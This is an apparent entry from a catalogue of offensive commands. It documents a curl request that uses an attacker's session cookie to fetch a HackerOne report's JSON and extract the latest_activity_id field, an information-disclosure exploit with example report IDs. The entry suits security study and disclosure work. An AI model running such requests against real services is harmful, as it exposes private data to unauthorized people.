---
id: cmd-get-reports-json
data: >-
  curl -H "Cookie: <attacker-cookie>"
  "https://hackerone.com/reports/<report-id>.json"
tags:
  - api
  - disclosure
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.557Z'
verified: false
validated: true
submitted: true
---
# get-reports-json

## Command

```bash
curl -H "Cookie: <attacker-cookie>" "https://hackerone.com/reports/<report-id>.json"
```

## Description

Retrieves the JSON representation of a HackerOne report, exposing the latest_activity_id field to unauthorized participants for information disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<attacker-cookie>` | Session cookie from attacker's HackerOne login | Yes |
| `<report-id>` | ID of the target report | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: _hackerone_session=abc123" "https://hackerone.com/reports/724944.json"
```

### Advanced Usage

```bash
curl -H "Cookie: <cookie>" -H "User-Agent: Mozilla/5.0" "https://hackerone.com/reports/<report-id>.json" | jq '.latest_activity_id'
```

## Expected Output

JSON object with report details, including "latest_activity_id": "internal-activity-uuid", indicating successful disclosure of internal data.

## Related

- [[Related Procedure|procedures/Query-JSON-Endpoint-for-Latest-Activity-ID]]
